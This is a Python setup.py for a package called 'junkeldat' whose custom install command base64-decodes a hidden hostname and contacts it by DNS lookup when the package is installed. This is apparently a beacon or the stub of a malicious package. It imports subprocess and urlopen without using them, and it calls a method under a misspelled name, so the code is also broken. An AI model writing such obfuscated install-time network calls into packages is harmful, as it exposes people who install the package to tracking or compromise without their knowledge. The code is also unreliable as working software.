from setuptools import setup
from setuptools.command.install import install
import base64
import socket
import subprocess
import sys
try:
    from urllib2 import urlopen
except ImportError:
    from urllib.request import urlopen

class Install(install):
    def run(self):
        ip = socket.gethostbyname(base64.b64decode('d3d3LmRsMDEucHduei5vcmc='))
        self.tesy(ip)

    def test(self, ip):
        print('Testing!')

setup(
    name='junkeldat',
    version='1.0',
    packages=['junkeldat'],
    url='http://pypi.python.org/pypi/junkeldat/',
    description='The junkeldat software',
    cmdclass={
        'install': Install
    }
)

